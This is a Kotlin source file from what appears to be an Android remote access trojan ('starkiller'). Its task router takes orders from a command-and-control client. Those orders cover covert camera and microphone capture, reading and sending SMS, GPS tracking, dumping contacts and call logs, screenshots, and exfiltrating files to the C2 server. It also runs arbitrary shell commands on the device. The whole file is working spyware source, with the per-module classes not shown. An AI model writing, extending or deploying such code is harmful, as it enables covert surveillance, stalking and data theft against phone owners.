package com.starkiller.agent

import com.starkiller.agent.modules.*
import org.json.JSONObject
import java.util.concurrent.Executors

class TaskRouter(private val service: StarKillerService) {

    private val executor = Executors.newFixedThreadPool(4)
    lateinit var client: C2Client

    private val deviceInfo by lazy { DeviceInfo(service) }
    private val cameraCapture by lazy { CameraCapture(service) }
    private val smsModule by lazy { SmsModule(service) }
    private val gpsTracker by lazy { GpsTracker(service) }
    private val contactsDump by lazy { ContactsDump(service) }
    private val fileManager by lazy { FileManager(service) }
    private val micRecorder by lazy { MicRecorder(service) }
    private val screenCapture by lazy { ScreenCapture(service) }
    private val callLogModule by lazy { CallLogReader(service) }
    private val appList by lazy { AppList(service) }

    fun dispatch(task: JSONObject) {
        executor.submit {
            val op = task.optString("op", "")
            val taskId = task.optString("task_id", "unknown")
            try {
                val result = when (op) {
                    "sysinfo" -> deviceInfo.collect()
                    "camera" -> {
                        val facing = task.optString("facing", "rear")
                        cameraCapture.capture(facing)
                    }
                    "sms_read" -> smsModule.readAll()
                    "sms_send" -> {
                        val number = task.getString("number")
                        val message = task.getString("message")
                        smsModule.send(number, message)
                    }
                    "gps" -> gpsTracker.getLocation()
                    "contacts" -> contactsDump.dump()
                    "ls" -> {
                        val path = task.optString("path", "/sdcard")
                        fileManager.listDir(path)
                    }
                    "download" -> {
                        val path = task.getString("path")
                        val bytes = fileManager.readFile(path)
                        if (bytes != null) {
                            client.sendFileData(taskId, path.substringAfterLast("/"), bytes)
                        }
                        JSONObject().put("status", if (bytes != null) "sent" else "file_not_found")
                    }
                    "upload" -> {
                        JSONObject().put("status", "upload_not_implemented")
                    }
                    "mic" -> {
                        val duration = task.optInt("duration", 10)
                        micRecorder.record(duration)
                    }
                    "screenshot" -> screenCapture.capture()
                    "calllog" -> callLogModule.read()
                    "apps" -> appList.installed()
                    "exec" -> {
                        val cmd = task.getString("command")
                        val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                        val out = proc.inputStream.bufferedReader().readText()
                        val err = proc.errorStream.bufferedReader().readText()
                        proc.waitFor()
                        JSONObject().apply {
                            put("stdout", out)
                            put("stderr", err)
                            put("exit_code", proc.exitValue())
                        }
                    }
                    "recon" -> {
                        val info = deviceInfo.collect()
                        val loc = gpsTracker.getLocation()
                        val apps = appList.installed()
                        JSONObject().apply {
                            put("device", info)
                            put("location", loc)
                            put("apps", apps)
                        }
                    }
                    "ping" -> JSONObject().put("pong", System.currentTimeMillis())
                    "exit" -> {
                        client.sendResult(taskId, JSONObject().put("status", "exiting"))
                        service.stopSelf()
                        return@submit
                    }
                    else -> JSONObject().put("error", "unknown op: $op")
                }
                client.sendResult(taskId, result)
            } catch (e: Exception) {
                client.sendResult(taskId, JSONObject().apply {
                    put("error", e.message ?: "unknown error")
                    put("op", op)
                })
            }
        }
    }
}
